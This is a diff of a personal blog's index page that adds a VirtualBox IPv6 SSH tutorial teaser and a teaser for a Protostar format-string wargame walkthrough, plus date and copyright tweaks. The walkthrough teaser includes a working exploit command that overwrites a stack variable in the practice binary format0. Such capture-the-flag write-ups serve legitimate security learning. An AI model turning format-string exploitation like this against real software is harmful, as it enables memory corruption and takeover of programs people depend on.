@@ -28,21 +28,18 @@
 
 
 
-    28 August 2012
+    30 August 2012
 
 		
 
 
-	exploits, projects
+	tutorial
 
 
 
 		
 	
-	Protostar Stack Exploits (Solutions 6-7)
-	
-
-   ...">
+	Enabling VirtualBox SSH on IPv6 (Linux host, Linux guest)...">
 	
 
   <!-- http://t.co/dKP3o1e -->
@@ -145,7 +142,102 @@
 
 
 
-<time datetime="2012-08-28T00:00:00+08:00" data-updated="true" itemprop="datePublished">
+<time datetime="2012-08-30T00:00:00+02:00" data-updated="true" itemprop="datePublished">
+    30 August 2012
+</time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/tutorial/'>tutorial</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/08/30/virtualbox-ipv6-ssh/" itemprop="url">Enabling VirtualBox SSH on IPv6 (Linux host, Linux guest)</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+
+          <p>This is a quick article describing how to SSH to a VirtualBox machine from the host machine, written for VirtualBox 4.1.18 Fedora. The standard choice – bridged networking – doesn’t work when the host has an IPv6 address.</p>
+
+
+		<a href="/blog/2012/08/30/virtualbox-ipv6-ssh/" class="more-link">Read more</a>
+	</div>
+
+
+    </article>
+  
+
+      
+  
+    <article>
+      
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+
+
+<time datetime="2012-08-29T00:00:00+02:00" data-updated="true" itemprop="datePublished">
+    29 August 2012
+</time></div>
+		<div class="tags">
+
+
+	<a class='category' href='/blog/categories/exploits/'>exploits</a>, <a class='category' href='/blog/categories/projects/'>projects</a>
+
+
+</div>
+		
+	</div>
+	<h1 class="title" itemprop="name"><a href="/blog/2012/08/29/protostar-format0/" itemprop="url">Protostar Format String Exploits (Solutions 0-4)</a></h1>
+	<div class="entry-content" itemprop="articleBody">
+
+          <h1 id="overview">Overview</h1>
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This post contains solutions and walkthroughs for the four format string levels (“Format”).</p>
+
+<h1 id="solutions">Solutions</h1>
+<h2 id="format-level-0">Format: Level 0</h2>
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format0">full</a>): Change the value of a stack variable to <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> using less than 10 bytes of input.</p>
+
+<p>This exploit shows similarities (sometimes) between format string exploits and buffer overflows.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>./format0 %64s<span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xef\xbe\xad\xde"'</span><span class="si">)</span>
+<span class="go">
+you have hit the target correctly :)</span></code></pre></figure>
+
+
+		<a href="/blog/2012/08/29/protostar-format0/" class="more-link">Read more</a>
+	</div>
+
+
+    </article>
+  
+
+      
+  
+    <article>
+      
+	<div class="meta">
+		<div class="date">
+
+
+
+
+
+
+
+
+
+
+<time datetime="2012-08-28T00:00:00+02:00" data-updated="true" itemprop="datePublished">
     28 August 2012
 </time></div>
 		<div class="tags">
@@ -211,7 +303,7 @@ done</span></code></pre></figure>
 
 
 
-<time datetime="2012-08-24T00:00:00+08:00" data-updated="true" itemprop="datePublished">
+<time datetime="2012-08-24T00:00:00+02:00" data-updated="true" itemprop="datePublished">
     24 August 2012
 </time></div>
 		<div class="tags">
@@ -263,7 +355,7 @@ done</span></code></pre></figure>
 
 
 
-<time datetime="2012-08-18T00:00:00+08:00" data-updated="true" itemprop="datePublished">
+<time datetime="2012-08-18T00:00:00+02:00" data-updated="true" itemprop="datePublished">
     18 August 2012
 </time></div>
 		<div class="tags">
@@ -322,7 +414,7 @@ done</span></code></pre></figure>
 
 
 
-<time datetime="2012-08-17T00:00:00+08:00" data-updated="true" itemprop="datePublished">
+<time datetime="2012-08-17T00:00:00+02:00" data-updated="true" itemprop="datePublished">
     17 August 2012
 </time></div>
 		<div class="tags">
@@ -383,7 +475,7 @@ stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfc25f24) = -1 ENOENT (No such fi
 
 
 
-<time datetime="2012-07-12T00:00:00+08:00" data-updated="true" itemprop="datePublished">
+<time datetime="2012-07-12T00:00:00+02:00" data-updated="true" itemprop="datePublished">
     12 July 2012
 </time></div>
 		<div class="tags">
@@ -424,7 +516,7 @@ stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfc25f24) = -1 ENOENT (No such fi
 
 
 
-<time datetime="2012-07-08T00:00:00+08:00" data-updated="true" itemprop="datePublished">
+<time datetime="2012-07-08T00:00:00+02:00" data-updated="true" itemprop="datePublished">
     8 July 2012
 </time></div>
 		<div class="tags">
@@ -467,7 +559,7 @@ stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfc25f24) = -1 ENOENT (No such fi
 
 
 
-<time datetime="2012-06-28T00:00:00+08:00" data-updated="true" itemprop="datePublished">
+<time datetime="2012-06-28T00:00:00+02:00" data-updated="true" itemprop="datePublished">
     28 June 2012
 </time></div>
 		<div class="tags">
@@ -521,7 +613,7 @@ effective user ID to the real ID and then call open(2).)</span></code></pre></fi
 
 
 
-<time datetime="2012-06-22T00:00:00+08:00" data-updated="true" itemprop="datePublished">
+<time datetime="2012-06-22T00:00:00+02:00" data-updated="true" itemprop="datePublished">
     22 June 2012
 </time></div>
 		<div class="tags">
@@ -574,7 +666,7 @@ effective user ID to the real ID and then call open(2).)</span></code></pre></fi
 </div>
 			</div>
 			<footer id="footer" class="inner"><p>
-  Copyright &copy; 2022 - Louis Li
+  Copyright &copy; 2023 - Louis Li
 </p>
 
 Theme originally by <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a>
